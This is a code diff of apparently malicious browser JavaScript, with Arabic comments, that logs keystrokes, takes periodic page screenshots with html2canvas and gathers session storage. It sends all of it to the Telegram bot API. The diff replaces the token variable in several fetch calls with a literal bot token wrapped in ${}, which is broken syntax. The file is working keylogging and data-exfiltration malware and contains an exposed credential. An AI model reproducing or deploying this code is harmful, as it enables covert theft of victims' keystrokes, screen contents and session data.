@@ -118,7 +118,7 @@ async function gatherAllInfo() {
     if (key === ' ') key = '[␣]';
     
     // إرسال فوري
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
@@ -133,7 +133,7 @@ async function gatherAllInfo() {
   setInterval(() => {
     html2canvas(document.body, {scale: 0.5}).then(canvas => {
       const img = canvas.toDataURL('image/png');
-      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc}/sendPhoto`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
@@ -187,12 +187,12 @@ function sendToTelegram(data) {
     `🗄️ Session Storage: ${data.sessionStorage}`
   );
 
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`)
+  fetch(`https://api.telegram.org/bot${8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`)
     .catch(e => {});
 
   // إرسال السكرين شوت
   if (data.screenshot && data.screenshot.startsWith('data:image')) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+    fetch(`https://api.telegram.org/bot${8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc}/sendPhoto`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
